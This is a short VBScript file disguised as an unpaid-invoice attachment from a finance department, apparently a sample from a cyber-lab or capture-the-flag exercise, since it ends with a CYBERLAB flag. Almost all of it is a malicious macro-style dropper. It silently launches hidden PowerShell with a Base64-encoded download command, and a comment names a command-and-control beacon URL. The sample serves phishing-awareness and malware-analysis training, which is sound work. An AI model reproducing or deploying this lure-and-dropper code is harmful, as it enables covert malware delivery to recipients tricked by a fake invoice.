' Facture Impayée - Direction Financière
Dim wsh
Set wsh = CreateObject("WScript.Shell")
' Auto-exécution du dropper via powershell
Dim cmd
cmd = "powershell -NoP -NonI -W Hidden -Enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
wsh.Run cmd, 0, False
' IOC_BEACON = https://c2.shadow-apt.org/implant.bin
' FLAG: CYBERLAB{PHISHING_MALICIOUS_MACRO_ATTACHMENT_NEUTRALIZED_552}
